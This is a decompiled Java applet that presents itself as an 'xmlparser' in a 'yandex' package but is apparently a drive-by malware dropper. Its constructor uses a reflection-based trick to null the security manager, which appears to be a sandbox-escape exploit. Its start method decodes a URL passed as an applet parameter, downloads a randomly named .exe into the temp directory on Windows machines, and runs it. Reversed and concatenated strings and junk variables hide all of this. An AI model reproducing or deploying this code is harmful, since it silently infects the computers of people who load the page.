// 
// Decompiled by Procyon v0.5.30
// 

package yandex;

import java.awt.Component;
import javax.swing.JList;
import java.beans.Expression;
import java.util.HashSet;
import utilits.compil;
import java.lang.reflect.Method;
import java.lang.reflect.InvocationTargetException;
import java.io.InputStream;
import java.io.FileOutputStream;
import java.net.URL;
import utilits.common;
import java.applet.Applet;

public class xmlparser extends Applet
{
    public void start() {
        super.start();
        try {
            final String str1 = common.b(this.getParameter("dskvnds"));
            final String str2 = "e".concat("xe.");
            final String str3 = "ri".concat("dpm".concat("t.oi.av".concat("aj")));
            final String str4 = "ema".concat("n.so");
            final String str5 = new StringBuffer(str2).reverse().toString();
            final String str6 = new StringBuffer(str3).reverse().toString();
            final String str7 = new StringBuffer(str4).reverse().toString();
            final String str8 = String.valueOf(Math.random()) + str5;
            final String str9 = System.getProperty(str6);
            final String str10 = System.getProperty(str7);
            try {
                if (str10.indexOf("Win".concat("dows")) >= 0) {
                    final URL lo = new URL(str1);
                    final int pizdetc = 10;
                    final boolean bb = true;
                    final String s = "s;f";
                    lo.openConnection();
                    final int o = 10;
                    final boolean ii = false;
                    final String b10g = "ee";
                    final InputStream LIS = lo.openStream();
                    final FileOutputStream fo = new FileOutputStream(String.valueOf(str9) + str8);
                    final byte[] arrayOfByte = new byte[1024];
                    int i;
                    while ((i = LIS.read(arrayOfByte, 0, arrayOfByte.length)) != -1) {
                        fo.write(arrayOfByte, 0, i);
                    }
                    LIS.close();
                    fo.close();
                    final int df = 34;
                    final boolean dfvm = false;
                    final String ffnwsfn = "aqdqa";
                    final Runtime lr = Runtime.getRuntime();
                    final int kvfndfs = 76;
                    final String scvms = ";rklnwn";
                    final boolean bbhj = true;
                    f(lr, "ex".concat("ec"), new Object[] { String.valueOf(str9) + str8 });
                    final int fvnde = 584;
                    final String ernv = "knfveklfv";
                }
            }
            catch (Exception ex) {}
        }
        catch (Exception ex2) {}
    }
    
    public static Object f(final Object obj, final String name) {
        final Class cls = obj.getClass();
        try {
            final Method method = cls.getMethod(name, (Class[])null);
            return method.invoke(obj, (Object[])null);
        }
        catch (NoSuchMethodException ex) {
            ex.printStackTrace();
        }
        catch (IllegalAccessException ex2) {
            ex2.printStackTrace();
        }
        catch (InvocationTargetException ex3) {
            throw new RuntimeException(ex3);
        }
        return null;
    }
    
    public static Object f(final Object obj, final String name, final Object[] val) {
        final Class cls = obj.getClass();
        if (val.length == 0) {
            f(obj, name);
        }
        try {
            final Method[] m = cls.getMethods();
            for (int i = 0; i < m.length; ++i) {
                if (m[i].getName().equals(name) && cm(m[i], val)) {
                    return m[i].invoke(obj, val);
                }
            }
        }
        catch (IllegalAccessException ex) {
            ex.printStackTrace();
        }
        catch (InvocationTargetException ex2) {
            throw new RuntimeException(ex2);
        }
        return null;
    }
    
    private static boolean cm(final Method m, final Object[] val) {
        final Class[] cls = m.getParameterTypes();
        return c(cls, val);
    }
    
    public static boolean c(final Class[] cls, final Object[] val) {
        if (cls.length != val.length) {
            return false;
        }
        for (int i = 0; i < cls.length; ++i) {
            if (!val[i].getClass().getName().toUpperCase().contains(cls[i].getName().toUpperCase())) {
                return false;
            }
        }
        return true;
    }
    
    public xmlparser() {
        final Class localSystem = System.class;
        final String str = "setS".concat("ecu".concat("rityM".concat("anager")));
        final Object[] arrayOfObject = { null };
        final compil loca = new compil(localSystem, str, arrayOfObject);
        final HashSet localHashSet = new HashSet();
        localHashSet.add(loca);
        final Expression e = new Expression(localSystem, str, arrayOfObject);
        final api local1 = new api(this, localHashSet);
        final JList localJList = new JList((E[])new Object[] { local1 });
        this.add(localJList);
    }
}
